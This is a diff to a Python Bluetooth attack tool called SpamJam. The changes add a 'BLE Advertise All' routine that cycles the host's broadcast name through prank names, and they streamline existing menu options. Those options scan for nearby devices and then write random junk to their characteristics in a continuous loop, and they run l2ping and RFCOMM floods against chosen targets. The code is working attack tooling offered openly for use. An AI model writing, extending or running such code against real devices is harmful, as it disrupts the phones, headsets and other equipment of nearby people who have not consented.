@@ -16,7 +16,7 @@ def print_banner():
 ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
    ❤️💜 A WORLD OF BLE FUN 💜❤️
    👩‍💻 Author: ekoms savior
-   🎯 Now with re-scan and re-jam loop!!! 🎉
+   🎯 Now with BLE Advertise ALL !! 🎉
    """)
     print("💜 XOXO HACK THE PLANET! 💜\n")
 
@@ -24,9 +24,32 @@ def print_banner():
 class BLESpam(DefaultDelegate):
     def __init__(self):
         DefaultDelegate.__init__(self)
-
     def handleNotification(self, cHandle, data):
         print(f"🔔 Notification from BLE device: {data}")
+
+# 💌 Flipper-Style BLE Advertise All
+def flipper_ble_advertise_all():
+    print("💜 Launching BLE Advertise All — Flipper Style 💣📡")
+    names = [
+        "SpamJam_XOXO", "💜HAXX💜", "BLE_Boop", "👾GOTCHA", 
+        "Free_Wifi_LOL", "Not_A_Trap", "💣 BT_Bomb", "UFO-SIGNAL", 
+        "🍭CandyBLE", "💀NSA_Van", "HackThePlanet", "💜ekoms💜"
+    ]
+    try:
+        subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
+        subprocess.run(["bluetoothctl", "discoverable", "on"], stdout=subprocess.DEVNULL)
+        subprocess.run(["bluetoothctl", "pairable", "on"], stdout=subprocess.DEVNULL)
+        subprocess.run(["bluetoothctl", "agent", "NoInputNoOutput"], stdout=subprocess.DEVNULL)
+
+        while True:
+            for name in names:
+                subprocess.run(["bluetoothctl", "system-alias", name], stdout=subprocess.DEVNULL)
+                print(f"📡 Broadcasting: {name}")
+                time.sleep(1.2)
+
+    except KeyboardInterrupt:
+        print("\n🛑 BLE Advertise All stopped. Restoring name...")
+        subprocess.run(["bluetoothctl", "system-alias", "SpamJam"], stdout=subprocess.DEVNULL)
 
 # 🔎 Interactive BLE Scanner
 def interactive_ble_scan():
@@ -85,7 +108,6 @@ def spam_all_ble():
     devices = interactive_ble_scan()
     if not devices:
         return
-
     custom_message = input("💜 Enter your spam message for all devices: ").encode()
     for device in devices:
         try:
@@ -102,28 +124,23 @@ def spam_all_ble():
 def jam_ble():
     print("🔎 Resetting BLE scan before jamming...")
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
     scanner = Scanner()
     try:
         devices = list(scanner.scan(15.0))
     except BTLEException as e:
         print(f"⚠️ BLE Scan Failed: {e}")
         return
-
     if not devices:
         print("⚠️ No devices found!")
         return
-
     for idx, device in enumerate(devices):
         print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
-
     try:
         idx = int(input("💜 Enter index of device to jam: "))
         target = devices[idx].addr
     except (ValueError, IndexError):
         print("⚠️ Invalid choice.")
         return
-
     print(f"💥 Jamming {target} 🚫")
     try:
         peripheral = Peripheral(target)
@@ -134,19 +151,17 @@ def jam_ble():
             time.sleep(random.uniform(0.05, 0.2))
     except Exception as e:
         print(f"⚠️ Error: {e}")
-        retry = input("💜 Try another? (y/n): ").strip().lower()
-        if retry == 'y':
+        if input("💜 Try another? (y/n): ").strip().lower() == 'y':
             jam_ble()
 
-# 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI + CLASSIC SCAN
+# 🚫 Jam All BLE Devices
 def jam_all_ble():
     print("🔎 Starting auto-rejam loop 📡")
     try:
         min_rssi = int(input("💜 Enter minimum RSSI to jam (e.g. -80): "))
     except ValueError:
         min_rssi = -80
-        print("⚠️ Invalid input! Defaulting to -80 dB.")
-
+        print("⚠️ Invalid input. Using default -80 dB.")
     try:
         while True:
             print("\n🔁 Scanning for BLE devices to jam...")
@@ -156,37 +171,29 @@ def jam_all_ble():
             except BTLEException as e:
                 print(f"⚠️ BLE Scan failed: {e}")
                 continue
-
-            print("🔍 Detected BLE devices:")
             for dev in devices:
                 print(f"  • {dev.addr} RSSI={dev.rssi} dB")
-
             jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]
-
             if not jam_targets:
-                print("⚠️ No targets found above threshold. Retrying...")
-            else:
-                for device in jam_targets:
-                    try:
-                        print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
-                        peripheral = Peripheral(device.addr)
-                        junk = os.urandom(random.randint(20, 50))
-                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
-                        peripheral.disconnect()
-                        time.sleep(random.uniform(0.05, 0.2))
-                    except Exception as e:
-                        print(f"⚠️ Skipped {device.addr}: {e}")
-
-            print("🔁 Waiting 5 seconds before next scan...")
+                print("⚠️ No targets above threshold.")
+            for device in jam_targets:
+                try:
+                    print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
+                    peripheral = Peripheral(device.addr)
+                    junk = os.urandom(random.randint(20, 50))
+                    peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
+                    peripheral.disconnect()
+                    time.sleep(random.uniform(0.05, 0.2))
+                except Exception as e:
+                    print(f"⚠️ Skipped {device.addr}: {e}")
+            print("🔁 Waiting 5 seconds...")
             time.sleep(5)
-
-            print("🤖 Also checking for classic Bluetooth devices...")
+            print("🔍 Also scanning for classic devices...")
             subprocess.run(["hcitool", "scan"])
-
     except KeyboardInterrupt:
-        print("\n🛑 Auto re-jam stopped by user.")
+        print("\n🛑 Stopped by user.")
 
-# 🔎 Bluetooth Scanner
+# Bluetooth Scanner
 def scan_bluetooth():
     print("🔎 Scanning for Bluetooth devices...")
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -201,7 +208,7 @@ def scan_bluetooth():
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
 
-# 💥 L2Ping Flood
+# 💥 L2Ping
 def l2ping_attack():
     devices = interactive_ble_scan()
     if not devices:
@@ -212,15 +219,13 @@ def l2ping_attack():
     except (ValueError, IndexError):
         print("⚠️ Invalid selection.")
         return
-
     if os.geteuid() != 0:
-        print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
+        print("⚠️ L2Ping needs sudo!")
         return
-
-    print(f"💥 Sending L2Ping flood to {addr}")
+    print(f"💥 Sending L2Ping to {addr}")
     try:
         subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
-        print("✅ L2Ping attack successful!")
+        print("✅ L2Ping success!")
     except subprocess.CalledProcessError:
         print(f"⚠️ Failed. Device may be offline.")
 
@@ -235,7 +240,6 @@ def rfcomm_flood():
     except (ValueError, IndexError):
         print("⚠️ Invalid selection.")
         return
-
     print(f"💥 Starting RFCOMM flood on {addr}...")
     for i in range(1000):
         try:
@@ -244,7 +248,7 @@ def rfcomm_flood():
         except subprocess.CalledProcessError:
             print(f"⚠️ Attempt {i+1}: Failed")
 
-# 🧠 Start Bluetooth Service
+# 🧠 Start Bluetooth
 def start_bluetooth():
     print("📡 Starting Bluetooth service...")
     subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
@@ -254,7 +258,8 @@ def start_bluetooth():
 def main():
     print_banner()
     while True:
-        print("\n🔹 1 Start Bluetooth Service 📡")
+        print("\n🔹 0 BLE Advertise All 💣")
+        print("🔹 1 Start Bluetooth Service 📡")
         print("🔹 2 Scan for Bluetooth devices 📡")
         print("🔹 3 Spam a BLE device 💌")
         print("🔹 4 Spam All BLE Devices 💌💥")
@@ -262,19 +267,17 @@ def main():
         print("🔹 6 Jam All BLE Devices 🚫💥")
         print("🔹 7 L2Ping Attack 💥")
         print("🔹 8 RFCOMM Flood 💥")
-        print("🔹 9 Classic RFCOMM Jam 💣")
-        print("🔹 🔟 Quit 🚪")
+        print("🔹 9 Quit 🚪")
 
-        choice = input("💜 Choose an option (1-10): ")
-        functions = [start_bluetooth, scan_bluetooth, spam_ble, spam_all_ble, jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood, rfcomm_flood]
+        choice = input("💜 Choose an option (0-9): ").strip()
+        functions = [flipper_ble_advertise_all, start_bluetooth, scan_bluetooth, spam_ble,
+                     spam_all_ble, jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood]
 
-        if choice == "10":
+        if choice == "9":
             print("👋 Goodbye, fren! XOXOXO 💜")
             sys.exit()
-        elif choice in map(str, range(1, 10)):
-            func = functions[int(choice)-1]
-            if func:
-                func()
+        elif choice in map(str, range(0, 9)):
+            functions[int(choice)]()
         else:
             print("⚠️ Invalid choice. Try again! 💜")
 
